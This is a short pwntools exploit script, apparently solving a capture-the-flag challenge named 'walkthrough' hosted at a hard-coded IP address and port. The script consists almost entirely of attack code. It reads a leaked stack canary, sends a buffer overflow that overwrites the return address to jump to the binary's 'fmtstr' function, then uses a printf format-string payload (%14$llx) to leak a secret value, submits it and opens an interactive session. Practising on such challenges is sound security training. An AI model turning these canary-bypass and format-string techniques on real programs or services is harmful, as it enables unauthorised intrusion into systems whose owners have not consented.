from pwn import *
e = ELF('./walkthrough')
p = connect('147.182.172.217', 42001) 
p.recvuntil('later): ')
canary = int(p.recvline(keepends = False), 16) #keepends = False drop the newline character
p.sendline(b'a' * 72 + p64(canary) + b'a' * 8 + p64(e.sym['fmtstr'] + 1)) #figure out what x and y values should be

p.recvuntil(b'Input the string that will be passed into printf.')
p.sendline(b'%14$llx')
p.recvuntil(b'The printf result is:\n')
s = p.recvline().decode().strip()
number = int(s, 16)
p.recvuntil(b"Now input the value you're guessing.")
p.sendline(str(number))
p.interactive()
